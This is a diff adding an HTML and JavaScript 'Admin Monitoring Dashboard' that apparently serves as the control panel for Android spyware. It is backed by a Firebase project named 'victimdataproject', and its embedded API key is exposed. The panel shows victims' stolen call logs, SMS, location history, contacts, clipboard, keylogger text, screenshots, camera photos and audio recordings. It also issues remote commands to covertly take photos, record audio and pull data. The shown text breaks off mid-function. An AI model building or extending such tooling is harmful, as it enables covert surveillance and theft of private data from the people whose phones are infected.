@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Monitoring Dashboard</title>
+    
+    <!-- Professional Font: Poppins -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Bootstrap 5.3 CSS for layout and components -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Bootstrap Icons for premium feel -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+    <style>
+        /* --- Base and Theme Setup --- */
+        :root {
+            --primary-color: #4a47a3;
+            --secondary-color: #706fd3;
+            --background-color: #f4f7fc;
+            --card-bg-color: #ffffff;
+            --text-color: #333;
+            --text-muted-color: #888;
+            --border-color: #e0e0e0;
+            --success-color: #2ecc71;
+            --danger-color: #e74c3c;
+            --warning-color: #f39c12;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            --sidebar-width: 260px;
+        }
+
+        [data-bs-theme="dark"] {
+            --primary-color: #5d5aef;
+            --secondary-color: #8380f3;
+            --background-color: #1a1a2e;
+            --card-bg-color: #242444;
+            --text-color: #e0e0e0;
+            --text-muted-color: #a0a0a0;
+            --border-color: #3a3a5a;
+            --shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            transition: background-color 0.3s, color 0.3s;
+            overflow-x: hidden;
+        }
+
+        /* --- Login Page --- */
+        #login-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+        }
+
+        .login-box {
+            background: var(--card-bg-color);
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: var(--shadow);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+        .login-box h2 {
+            color: var(--primary-color);
+            margin-bottom: 25px;
+            font-weight: 700;
+        }
+        .login-box .form-control {
+            background: var(--background-color);
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+        }
+        .login-box .btn-primary {
+            background-color: var(--primary-color);
+            border-color: var(--primary-color);
+            padding: 10px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+        .login-box .btn-primary:hover {
+            background-color: var(--secondary-color);
+            border-color: var(--secondary-color);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+
+        /* --- Main Dashboard Layout --- */
+        #dashboard-container {
+            display: none; /* Hidden by default */
+        }
+        .sidebar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: var(--sidebar-width);
+            background-color: var(--card-bg-color);
+            box-shadow: var(--shadow);
+            padding: 20px;
+            z-index: 1000;
+            transition: transform 0.3s ease-in-out;
+            overflow-y: auto;
+        }
+        .sidebar .nav-link {
+            display: flex;
+            align-items: center;
+            padding: 12px 15px;
+            margin-bottom: 5px;
+            border-radius: 8px;
+            color: var(--text-muted-color);
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+        .sidebar .nav-link i {
+            margin-right: 15px;
+            font-size: 1.2rem;
+            width: 25px;
+            text-align: center;
+        }
+        .sidebar .nav-link:hover, .sidebar .nav-link.active {
+            background-color: var(--primary-color);
+            color: #fff;
+            box-shadow: 0 4px 8px rgba(74, 71, 163, 0.3);
+        }
+        .main-content {
+            margin-left: var(--sidebar-width);
+            padding: 20px;
+            transition: margin-left 0.3s ease-in-out;
+        }
+
+        /* --- Header --- */
+        .header {
+            background: var(--card-bg-color);
+            padding: 10px 20px;
+            border-radius: 12px;
+            box-shadow: var(--shadow);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        .header .form-select { width: auto; font-weight: 600; }
+        .header .btn { border-radius: 50%; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; }
+
+        /* --- Content Cards --- */
+        .content-card {
+            background-color: var(--card-bg-color);
+            border-radius: 12px;
+            box-shadow: var(--shadow);
+            margin-bottom: 25px;
+            padding: 20px;
+            transition: all 0.3s ease;
+        }
+        .content-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+        }
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 15px;
+            margin-bottom: 15px;
+            border-bottom: 1px solid var(--border-color);
+        }
+        .card-header h3 {
+            margin: 0;
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: var(--primary-color);
+        }
+        .table-responsive { max-height: 400px; }
+        .table thead th {
+            background-color: var(--background-color);
+            font-weight: 600;
+        }
+        
+        /* --- Media Viewers --- */
+        .media-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px;
+        }
+        .media-item img {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        .media-item img:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        .audio-item {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            background-color: var(--background-color);
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+        .audio-item p { margin: 0 10px; flex-grow: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .audio-item audio { height: 40px; }
+
+        /* --- Other Elements --- */
+        .status-dot {
+            height: 12px;
+            width: 12px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 8px;
+            animation: pulse 2s infinite;
+        }
+        .status-dot.online { background-color: var(--success-color); }
+        .status-dot.offline { background-color: var(--danger-color); animation: none; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(46, 204, 113, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(46, 204, 113, 0); } 100% { box-shadow: 0 0 0 0 rgba(46, 204, 113, 0); } }
+
+        .form-control, .form-select {
+            background-color: var(--background-color);
+            border-color: var(--border-color);
+            color: var(--text-color);
+        }
+        .form-control:focus, .form-select:focus {
+            background-color: var(--background-color);
+            color: var(--text-color);
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 0.25rem rgba(74, 71, 163, 0.25);
+        }
+        .btn-refresh {
+            color: var(--primary-color);
+            transition: transform 0.5s;
+        }
+        .btn-refresh:hover {
+            color: var(--secondary-color);
+            transform: rotate(360deg);
+        }
+
+        /* --- Responsive Design --- */
+        @media (max-width: 992px) {
+            .sidebar { transform: translateX(-100%); }
+            .sidebar.active { transform: translateX(0); }
+            .main-content { margin-left: 0; }
+            .header {
+                position: sticky;
+                top: 10px;
+                z-index: 1020;
+            }
+        }
+        
+        .no-data {
+            text-align: center;
+            padding: 40px 20px;
+            color: var(--text-muted-color);
+            font-style: italic;
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- ======== LOGIN CONTAINER ======== -->
+    <div id="login-container">
+        <div class="login-box">
+            <h2><i class="bi bi-shield-lock-fill"></i> Admin Panel</h2>
+            <form id="login-form">
+                <div class="form-floating mb-3">
+                    <input type="email" class="form-control" id="login-email" placeholder="name@example.com" required>
+                    <label for="login-email">Email address</label>
+                </div>
+                <div class="form-floating mb-4">
+                    <input type="password" class="form-control" id="login-password" placeholder="Password" required>
+                    <label for="login-password">Password</label>
+                </div>
+                <button type="submit" class="btn btn-primary w-100">Log In</button>
+                <p id="login-error" class="text-danger mt-3"></p>
+            </form>
+        </div>
+    </div>
+
+    <!-- ======== MAIN DASHBOARD CONTAINER ======== -->
+    <div id="dashboard-container">
+        <!-- Sidebar Navigation -->
+        <nav class="sidebar" id="sidebar">
+            <h4 class="text-center mb-4" style="color: var(--primary-color);"><i class="bi bi-binoculars-fill"></i> Monitor</h4>
+            <ul class="nav flex-column">
+                <li class="nav-item"><a class="nav-link active" href="#summary"><i class="bi bi-grid-1x2-fill"></i> Summary</a></li>
+                <li class="nav-item"><a class="nav-link" href="#commands"><i class="bi bi-terminal-fill"></i> Commands</a></li>
+                <li class="nav-item"><a class="nav-link" href="#call_logs"><i class="bi bi-telephone-fill"></i> Call Logs</a></li>
+                <li class="nav-item"><a class="nav-link" href="#sms_logs"><i class="bi bi-chat-left-text-fill"></i> SMS Logs</a></li>
+                <li class="nav-item"><a class="nav-link" href="#location"><i class="bi bi-geo-alt-fill"></i> Location</a></li>
+                <li class="nav-item"><a class="nav-link" href="#notifications"><i class="bi bi-bell-fill"></i> Notifications</a></li>
+                <li class="nav-item"><a class="nav-link" href="#contacts"><i class="bi bi-person-lines-fill"></i> Contacts</a></li>
+                <li class="nav-item"><a class="nav-link" href="#clipboard"><i class="bi bi-clipboard-fill"></i> Clipboard</a></li>
+                <li class="nav-item"><a class="nav-link" href="#keylogger"><i class="bi bi-keyboard-fill"></i> Keylogger</a></li>
+                <li class="nav-item"><a class="nav-link" href="#screenshots"><i class="bi bi-image-fill"></i> Screenshots</a></li>
+                <li class="nav-item"><a class="nav-link" href="#camera_photos"><i class="bi bi-camera-fill"></i> Camera Photos</a></li>
+                <li class="nav-item"><a class="nav-link" href="#audio"><i class="bi bi-mic-fill"></i> Audio Recordings</a></li>
+                <li class="nav-item"><a class="nav-link" href="#files"><i class="bi bi-folder-fill"></i> File Manager</a></li>
+                <li class="nav-item"><a class="nav-link" href="#installed_apps"><i class="bi bi-app-indicator"></i> Installed Apps</a></li>
+                <li class="nav-item"><a class="nav-link" href="#app_usage"><i class="bi bi-bar-chart-fill"></i> App Usage</a></li>
+                <li class="nav-item"><a class="nav-link" href="#device_events"><i class="bi bi-calendar-event-fill"></i> Device Events</a></li>
+                <li class="nav-item"><a class="nav-link" href="#other_logs"><i class="bi bi-three-dots"></i> Other Logs</a></li>
+            </ul>
+        </nav>
+
+        <!-- Main Content Area -->
+        <main class="main-content" id="main-content">
+            <!-- Header -->
+            <header class="header">
+                 <button class="btn d-lg-none" id="sidebar-toggle"><i class="bi bi-list"></i></button>
+                 <div class="d-flex align-items-center">
+                     <span class="me-2 fw-bold">Device:</span>
+                     <select class="form-select form-select-sm" id="device-selector"></select>
+                 </div>
+                 <div class="d-flex align-items-center">
+                    <button class="btn" id="theme-toggler" title="Toggle Theme"><i class="bi bi-moon-stars-fill"></i></button>
+                    <button class="btn text-danger" id="logout-button" title="Logout"><i class="bi bi-box-arrow-right"></i></button>
+                 </div>
+            </header>
+
+            <!-- Content Sections -->
+            <div id="content-sections">
+                
+                <!-- Summary Section -->
+                <section id="summary" class="content-card">
+                    <div class="card-header"><h3><i class="bi bi-grid-1x2-fill"></i> Device Summary</h3><button class="btn btn-sm btn-refresh" onclick="refreshAllData()"><i class="bi bi-arrow-clockwise fs-5"></i></button></div>
+                    <div class="row">
+                        <!-- Device Status -->
+                        <div class="col-md-6 col-lg-4 mb-3">
+                            <div class="p-3 rounded" style="background: var(--background-color);">
+                                <h5><i class="bi bi-activity text-primary"></i> Status</h5>
+                                <p id="summary-status" class="fs-5 mb-0"><span class="status-dot offline"></span> Offline</p>
+                            </div>
+                        </div>
+                        <!-- Device Info -->
+                        <div class="col-md-6 col-lg-8 mb-3">
+                            <div class="p-3 rounded" style="background: var(--background-color);">
+                                <h5><i class="bi bi-phone-fill text-primary"></i> Device Info</h5>
+                                <p id="summary-device-info" class="mb-0">Brand, Model, OS</p>
+                            </div>
+                        </div>
+                        <!-- Battery -->
+                        <div class="col-md-6 col-lg-4 mb-3">
+                            <div class="p-3 rounded" style="background: var(--background-color);">
+                                <h5><i class="bi bi-battery-full text-success"></i> Battery</h5>
+                                <p id="summary-battery" class="fs-5 mb-0">N/A</p>
+                            </div>
+                        </div>
+                        <!-- Network -->
+                        <div class="col-md-6 col-lg-4 mb-3">
+                           <div class="p-3 rounded" style="background: var(--background-color);">
+                                <h5><i class="bi bi-wifi text-info"></i> Network</h5>
+                                <p id="summary-network" class="mb-0">IP: N/A</p>
+                            </div>
+                        </div>
+                        <!-- Storage -->
+                        <div class="col-md-6 col-lg-4 mb-3">
+                            <div class="p-3 rounded" style="background: var(--background-color);">
+                                <h5><i class="bi bi-hdd-fill text-warning"></i> Storage</h5>
+                                <p id="summary-storage" class="mb-0">N/A</p>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <!-- Command Sender Section -->
+                <section id="commands" class="content-card">
+                    <div class="card-header"><h3><i class="bi bi-terminal-fill"></i> Remote Commands</h3></div>
+                    <div class="row">
+                        <div class="col-md-8">
+                            <select class="form-select" id="command-selector">
+                                <option value="take_photo_front">Take Photo (Front Cam)</option>
+                                <option value="take_photo_back">Take Photo (Back Cam)</option>
+                                <option value="get_location">Fetch Location</option>
+                                <option value="start_audio_record">Start Audio Record (1 min)</option>
+                                <option value="get_call_logs">Fetch Call Logs</option>
+                                <option value="get_sms">Fetch SMS</option>
+                                <option value="get_contacts">Fetch Contacts</option>
+                                <option value="vibrate">Vibrate Phone (2s)</option>
+                                <option value="show_toast">Show Toast Message</option>
+                            </select>
+                            <input type="text" id="command-param" class="form-control mt-2" placeholder="Parameter (e.g., Toast Message)">
+                        </div>
+                        <div class="col-md-4 mt-2 mt-md-0">
+                            <button class="btn btn-primary w-100" id="send-command-btn"><i class="bi bi-send-fill"></i> Send Command</button>
+                        </div>
+                    </div>
+                     <div class="mt-3">
+                        <h6>Last Sent Commands:</h6>
+                        <div class="table-responsive" style="max-height: 150px;">
+                            <table class="table table-sm table-striped"><thead><tr><th>Command</th><th>Timestamp</th></tr></thead><tbody id="command-history-table"></tbody></table>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Dynamic Content Sections will be generated by JS -->
+                <div id="dynamic-sections"></div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Image Viewer Modal -->
+    <div class="modal fade" id="imageModal" tabindex="-1">
+        <div class="modal-dialog modal-lg modal-dialog-centered">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="imageModalLabel">Image Preview</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body text-center">
+                    <img src="" id="modalImage" class="img-fluid" alt="Preview">
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>
+
+    <!-- Bootstrap 5.3 JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script>
+    document.addEventListener('DOMContentLoaded', () => {
+
+        // --- Firebase Configuration ---
+        // IMPORTANT: Replace with your actual Firebase project configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAOA7R6MWf_VGVScscqL3ND0zs3kMVCTYk",
+            authDomain: "victimdataproject.firebaseapp.com",
+            databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com",
+            projectId: "victimdataproject",
+            storageBucket: "victimdataproject.firebasestorage.app",
+            messagingSenderId: "938788267301",
+            appId: "1:938788267301:web:cdcff391160dce48fa66cc"
+        };
+
+        // --- Initialize Firebase ---
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.database();
+        const storage = firebase.storage();
+
+        // --- Global State ---
+        let currentDeviceId = null;
+        let autoRefreshInterval = null;
+        const REFRESH_INTERVAL_MS = 30000; // 30 seconds
+
+        // --- UI Elements ---
+        const loginContainer = document.getElementById('login-container');
+        const dashboardContainer = document.getElementById('dashboard-container');
+        const loginForm = document.getElementById('login-form');
+        const loginError = document.getElementById('login-error');
+        const logoutButton = document.getElementById('logout-button');
+        const deviceSelector = document.getElementById('device-selector');
+        const mainContent = document.getElementById('main-content');
+        const sidebar = document.getElementById('sidebar');
+        const sidebarToggle = document.getElementById('sidebar-toggle');
+        const themeToggler = document.getElementById('theme-toggler');
+        const dynamicSections = document.getElementById('dynamic-sections');
+
+        // --- Authentication Logic ---
+        auth.onAuthStateChanged(user => {
+            if (user) {
+                // User is logged in
+                loginContainer.style.display = 'none';
+                dashboardContainer.style.display = 'block';
+                initializeDashboard();
+            } else {
+                // User is logged out
+                loginContainer.style.display = 'flex';
+                dashboardContainer.style.display = 'none';
+                if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+            }
+        });
+
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const email = document.getElementById('login-email').value;
+            const password = document.getElementById('login-password').value;
+            loginError.textContent = '';
+
+            auth.signInWithEmailAndPassword(email, password)
+                .catch(error => {
+                    loginError.textContent = error.message;
+                });
+        });
+
+        logoutButton.addEventListener('click', () => {
+            auth.signOut();
+        });
+
+        // --- Dashboard Initialization ---
+        function initializeDashboard() {
+            setupUIEventListeners();
+            loadDeviceList();
+            setupTheme();
+            createDynamicSections();
+        }
+
+        function loadDeviceList() {
+            const usersRef = db.ref('users');
+            usersRef.once('value', snapshot => {
+                deviceSelector.innerHTML = '';
+                if (snapshot.exists()) {
+                    snapshot.forEach(childSnapshot => {
+                        const deviceId = childSnapshot.key;
+                        const option = document.createElement('option');
+                        option.value = deviceId;
+                        option.textContent = deviceId;
+                        deviceSelector.appendChild(option);
+                    });
+                    if (deviceSelector.options.length > 0) {
+                        currentDeviceId = deviceSelector.value;
+                        loadAllDataForDevice(currentDeviceId);
+                    }
+                } else {
+                    const option = document.createElement('option');
+                    option.textContent = 'No devices found';
+                    deviceSelector.appendChild(option);
+                }
+            });
+        }
+
+        deviceSelector.addEventListener('change', (e) => {
+            currentDeviceId = e.target.value;
+            loadAllDataForDevice(currentDeviceId);
+        });
+        
+        // --- Data Loading ---
+        function loadAllDataForDevice(deviceId) {
+            if (!deviceId) return;
+
+            // Clear previous interval
+            if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+
+            // Fetch all data immediately
+            refreshAllData();
+
+            // Setup new interval
+            autoRefreshInterval = setInterval(refreshAllData, REFRESH_INTERVAL_MS);
+        }
+        
+        window.refreshAllData = function() {
+            if (!currentDeviceId) return;
+            console.log(`Refreshing all data for ${currentDeviceId} at ${new Date().toLocaleTimeString()}`);
+            
+            // Summary Widgets
+            fetchData(`status`, updateSummaryStatus);
+            fetchData(`device_info`, updateSummaryDeviceInfo);
+            fetchData(`battery`, updateSummaryBattery);
+            fetchData(`network_info`, updateSummaryNetwork);
+            fetchData(`storage_usage`, updateSummaryStorage);
+
+            // Detailed Sections
+            fetchTableData('call_logs', 'calls', ['Name', 'Number', 'Type', 'Duration', 'Date'], ['name', 'number', 'type', 'duration', 'date']);
+            fetchTableData('sms_logs', 'sms', ['Name', 'Number', 'Message', 'Type', 'Date'], ['name', 'number', 'body', 'type', 'date']);
+            fetchTableData('location', 'location', ['Latitude', 'Longitude', 'Address', 'Timestamp'], ['latitude', 'longitude', 'address', 'timestamp']);
+            fetchTableData('notifications', 'notifications', ['App', 'Title', 'Text', 'Time'], ['packageName', 'title', 'text', 'postTime']);
+            fetchTableData('contacts', 'contacts', ['Name', 'Numbers'], ['name', 'phoneNumbers']);
+            fetchTableData('clipboard', 'clipboard', ['Text', 'Timestamp'], ['text', 'timestamp']);
+            fetchTableData('keylogger', 'keylogger', ['Text', 'Timestamp'], ['text', 'timestamp']);
+            fetchTableData('installed_apps', 'installed_apps', ['App Name', 'Package Name'], ['appName', 'packageName']);
+            fetchTableData('app_usage', 'usage_stats', ['Package', 'Usage Time (ms)'], ['packageName', 'totalTimeInForeground']);
+            fetchTableData('device_events', 'events', ['Event', 'Timestamp'], ['event', 'timestamp']);
+            
+            fetchMediaData('screenshots', 'screenshots', 'image');
+            fetchMediaData('camera_photos', 'camera_photos', 'image');
+            fetchMediaData('audio', 'audio', 'audio');
+            fetchFileData('files', 'file_list');
+            fetchTableData('other_logs', 'other_logs', ['Type', 'Log', 'Timestamp'], ['type', 'log', 'timestamp']);
+            fetchTableData('command-history-table', 'commands', ['Command', 'Timestamp'], ['command', 'timestamp'], true, true);
+        }
+
+        // Generic fetch for simple key-value data
+        function fetchData(path, callback) {
+            if (!currentDeviceId) return;
+            db.ref(`users/${currentDeviceId}/${path}`).on('value', snapshot => {
+                if (snapshot.exists()) {
+                    callback(snapshot.val());
+                } else {
+                    callback(null);
+                }
+            }, err => console.error(`Error fetching ${path}:`, err));
+        }
+
+        // --- Summary Update Functions ---
+        function updateSummaryStatus(data) {
+            const el = document.getElementById('summary-status');
+            if (data && data.isOnline) {
+                const lastSeen = new Date(data.timestamp).toLocaleString();
+                el.innerHTML = `<span class="status-dot online"></span> Online (Last seen: ${lastSeen})`;
+            } else {
+                el.innerHTML = `<span class="status-dot offline"></span> Offline`;
+            }
+        }
+        function updateSummaryDeviceInfo(data) {
+            document.getElementById('summary-device-info').textContent = data ? `${data.brand} ${data.model} (Android ${data.osVersion})` : 'N/A';
+        }
+        function updateSummaryBattery(data) {
+            document.getElementById('summary-battery').textContent = data ? `${data.level}% (${data.isCharging ? 'Charging' : 'Discharging'})` : 'N/A';
+        }
+        function updateSummaryNetwork(data) {
+             document.getElementById('summary-network').textContent = data ? `IP: ${data.ipAddress || 'N/A'}` : 'N/A';
+        }
+        function updateSummaryStorage(data) {
+             document.getElementById('summary-storage').textContent = data ? `Used: ${data.usedGB}GB / Total: ${data.totalGB}GB` : 'N/A';
+        }
+
+
+        // --- Generic Data Table Renderer ---
+        function fetchTableData(elementId, path, headers, dataKeys, isSubTable = false, reverse = false) {
+             if (!currentDeviceId) return;
+             const tableBody = document.getElementById(isSubTable ? elementId : `${elementId}-table`);
+             if (!tableBody) return;
+
+             db.ref(`users/${currentDeviceId}/${path}`).limitToLast(100).on('value', snapshot => {
+                tableBody.innerHTML = '';
+                if (snapshot.exists()) {
+                    let items = [];
+                    snapshot.forEach(child => { items.push(child.val()); });
+                    if(reverse) items.reverse();
+
+                    items.forEach(data => {
+                        const row = document.createElement('tr');
+                        dataKeys.forEach(key => {
+                            const cell = document.createElement('td');
+                            let value = data[key] || 'N/A';
+                            if (key.toLowerCase().includes('date') || key.toLowerCase().includes('time')) {
+                                value = new Date(value).toLocaleString();
+                            }
+                            if(key === 'body' || key === 'text') {
+                                value = value.length > 50 ? value.substring(0, 50) + '...' : value;
+                            }
+                            cell.textContent = value;
+                            row.appendChild(cell);
+                        });
+                        tableBody.appendChild(row);
+                    });
+                } else {
+                    const row = document.createElement('tr');
+                    const cell = document.createElement('td');
+                    cell.colSpan = headers.length;
+                    cell.className = 'no-data';
+                    cell.textContent = 'No data available.';
+                    row.appendChild(cell);
+                    tableBody.appendChild(row);
+                }
+            });
+        }
+
+        // --- Generic Media Renderer ---
+        const imageModal = new bootstrap.Modal(document.getElementById('imageModal'));
+        const modalImage = document.getElementById('modalImage');
+
+        function fetchMediaData(elementId, path, type) {
+            if (!currentDeviceId) return;
+            const container = document.getElementById(`${elementId}-grid`);
+            if (!container) return;
+
+            const dbRef = db.ref(`users/${currentDeviceId}/${path}`);
+            dbRef.limitToLast(20).on('value', snapshot => {
+                container.innerHTML = '';
+                if (snapshot.exists()) {
+                    snapshot.forEach(childSnapshot => {
+                        const fileName = childSnapshot.val().fileName;
+                        if (!fileName) return;
+
+                        const storageRef = storage.ref(`users/${currentDeviceId}/${path}/${fileName}`);
+                        storageRef.getDownloadURL().then(url => {
+                            if (type === 'image') {
+                                const imgItem = document.createElement('div');
+                                imgItem.className = 'media-item';
+                                imgItem.innerHTML = `<img src="${url}" alt="${fileName}">`;
+                                imgItem.onclick = () => {
+                                    modalImage.src = url;
+                                    imageModal.show();
+                                };
+                                container.prepend(imgItem);
+                            } else if (type === 'audio') {
+                                const audioItem = document.createElement('div');
+                                audioItem.className = 'audio-item';
+                                audioItem.innerHTML = `
+                                    <i class="bi bi-music-note-beamed"></i>
+                                    <p>${fileName}</p>
+                                    <audio controls src="${url}"></audio>
+                                `;
+                                container.prepend(audioItem);
+                            }
+                        }).catch(err => console.error(`Error getting URL for ${fileName}:`, err));
+                    });
+                } else {
+                    container.innerHTML = '<p class="no-data">No media found.</p>';
+                }
+            });
+        }
+        
+        // --- File Manager Renderer ---
+        function fetchFileData(elementId, path) {
+            if (!currentDeviceId) return;
+            const container = document.getElementById(`${elementId}-list`);
+            if (!container) return;
+
+            const dbRef = db.ref(`users/${currentDeviceId}/${path}`);
+            dbRef.limitToLast(100).on('value', snapshot => {
+                container.innerHTML = '';
+                if(snapshot.exists()) {
+                    snapshot.forEach(childSnapshot => {
+                        const file = childSnapshot.val();
+                        const item = document.createElement('div');
+                        item.className = 'd-flex justify-content-between align-items-center p-2 border-bottom';
+                        const icon = file.isDirectory ? 'bi-folder-fill text-warning' : 'bi-file-earmark-text';
+                        item.innerHTML = `
+                            <div><i class="bi ${icon} me-2"></i> ${file.name}</div>
+                            <small class="text-muted">${file.size ? (file.size / 1024).toFixed(2) + ' KB' : ''}</small>
+                        `;
+                        container.appendChild(item);
+                    });
+                } else {
+                    container.innerHTML = '<p class="no-data">No files listed.</p>';
+                }
+            });
+        }
+
+        // --- Command Sender Logic ---
+        document.getElementById('send-command-btn').addEventListener('click', () => {
+            if (!currentDeviceId) {
+                alert('Please select a device first.');
+                return;
+            }
+            const command = document.getElementById('command-selector').value;
+            const param = document.getElementById('command-param').value;
+
+            const commandObj = {
+                command: command,
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            };
+            if(param) commandObj.parameter = param;
+
+            db.ref(`users/${currentDeviceId}/commands`).push(commandObj)
+                .then(() => {
+                    alert('Command sent successfully!');
+                    document.getElementById('command-param').value = '';
+                })
+                .catch(err => alert('Error sending command: ' + err.message));
+        });
+
+        // --- UI and Theme Setup ---
+        function setupUIEventListeners() {
+            sidebarToggle.addEventListener('click', () => sidebar.classList.toggle('active'));
+            document.addEventListener('click', (e) => {
+                if (!sidebar.contains(e.target) && !sidebarToggle.contains(e.target) && sidebar.classList.contains('active')) {
+                    sidebar.classList.remove('active');
+                }
+            });
+            
+            document.querySelectorAll('.sidebar .nav-link').forEach(link => {
+                link.addEventListener('click', (e) => {
+                    document.querySelector('.sidebar .nav-link.active').classList.remove('active');
+                    e.currentTarget.classList.add('active');
+                    if(window.innerWidth < 992) sidebar.classList.remove('active');
+                });
+            });
+        }
+        
+        function setupTheme() {
+            const savedTheme = localStorage.getItem('theme') || 'light';
+            document.documentElement.setAttribute('data-bs-theme', savedTheme);
+            themeToggler.querySelector('i').className = savedTheme === 'dark' ? 'bi bi-sun-fill' : 'bi bi-moon-stars-fill';
+
+            themeToggler.addEventListener('click', () => {
+                const currentTheme = document.documentElement.getAttribute('data-bs-theme');
+                const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
+                document.documentElement.setAttribute('data-bs-theme', newTheme);
+                localStorage.setItem('theme', newTheme);
+                themeToggler.querySelector('i').className = newTheme === 'dark' ? 'bi bi-sun-fill' : 'bi bi-moon-stars-fill';
+            });
+        }
+        
+        // --- Dynamically Create Content Cards ---
+        function createDynamicSections() {
+            const sections = [
+                { id: 'call_logs', title: 'Call Logs', icon: 'telephone-fill', type: 'table', headers: ['Name', 'Number', 'Type', 'Duration', 'Date'] },
+                { id: 'sms_logs', title: 'SMS Logs', icon: 'chat-left-text-fill', type: 'table', headers: ['Name', 'Number', 'Message', 'Type', 'Date'] },
+                { id: 'location', title: 'Location History', icon: 'geo-alt-fill', type: 'table', headers: ['Latitude', 'Longitude', 'Address', 'Timestamp'] },
+                { id: 'notifications', title: 'Notification Logs', icon: 'bell-fill', type: 'table', headers: ['App', 'Title', 'Text', 'Time'] },
+                { id: 'contacts', title: 'Contacts', icon: 'person-lines-fill', type: 'table', headers: ['Name', 'Numbers'] },
+                { id: 'clipboard', title: 'Clipboard History', icon: 'clipboard-fill', type: 'table', headers: ['Text', 'Timestamp'] },
+                { id: 'keylogger', title: 'Keylogger', icon: 'keyboard-fill', type: 'table', headers: ['Text', 'Timestamp'] },
+                { id: 'screenshots', title: 'Screenshots', icon: 'image-fill', type: 'media-grid' },
+                { id: 'camera_photos', title: 'Camera Photos', icon: 'camera-fill', type: 'media-grid' },
+                { id: 'audio', title: 'Audio Recordings', icon: 'mic-fill', type: 'media-list' },
+                { id: 'files', title: 'File Manager', icon: 'folder-fill', type: 'file-list' },
+                { id: 'installed_apps', title: 'Installed Apps', icon: 'app-indicator', type: 'table', headers: ['App Name', 'Package Name'] },
+                { id: 'app_usage', title: 'App Usage Stats', icon: 'bar-chart-fill', type: 'table', headers: ['Package', 'Usage Time (ms)'] },
+                { id: 'device_events', title: 'Device Events', icon: 'calendar-event-fill', type: 'table', headers: ['Event (Screen ON/OFF etc.)', 'Timestamp']},
+                { id: 'other_logs', title: 'Other Logs', icon: 'three-dots', type: 'table', headers: ['Type', 'Log Data', 'Timestamp']},
+            ];
+
+            let html = '';
+            sections.forEach(s => {
+                html += `
+                <section id="${s.id}" class="content-card">
+                    <div class="card-header">
+                        <h3><i class="bi bi-${s.icon}"></i> ${s.title}</h3>
+                        <button class="btn btn-sm btn-refresh" onclick="refreshSection('${s.id}')"><i class="bi bi-arrow-clockwise fs-5"></i></button>
+                    </div>
+                `;
